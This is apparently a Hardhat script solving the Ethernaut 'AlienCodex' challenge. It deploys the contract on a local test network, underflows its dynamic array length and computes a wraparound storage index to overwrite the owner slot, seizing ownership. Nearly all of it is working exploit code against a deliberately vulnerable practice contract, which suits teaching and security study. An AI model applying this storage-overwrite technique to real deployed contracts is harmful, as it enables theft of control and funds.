// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const { expect } = require("chai");


async function main() {
    // Hardhat always runs the compile task when running scripts with its command
    // line interface.
    //
    // If this script is run directly using `node` you may want to call compile
    // manually to make sure everything is compiled
    // await hre.run('compile');

    // We get the contract to deploy

    const signers = await hre.ethers.getSigners();
    AlienCodex = await hre.ethers.getContractFactory("AlienCodex");
    target = await AlienCodex.deploy();
    await target.deployed();
    expect(await target.owner()).to.equal(signers[0].address);

    target = target.connect(signers[1]);
    tx = await target.make_contact();
    await tx.wait();
    expect(await target.contact()).to.equal(true);



    arrayBegin = BigInt(hre.ethers.utils.keccak256(
        '0x' + '1'.padStart(64, '0')
    ));
    console.log("arrayBegin", arrayBegin);

    const i = BigInt("0x10000000000000000000000000000000000000000000000000000000000000000") - arrayBegin;
    console.log("i", i);
    console.log("target", target.address);
    tx = await target.retract();
    await tx.wait();
    // within a word, variables are laid out from right to left, not left to right
    tx = await target.revise(i, '0x' + '0'.padStart(24, '0') + signers[1].address.substr(2));
    await tx.wait();

    expect(await target.owner()).to.equal(signers[1].address);
}


// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
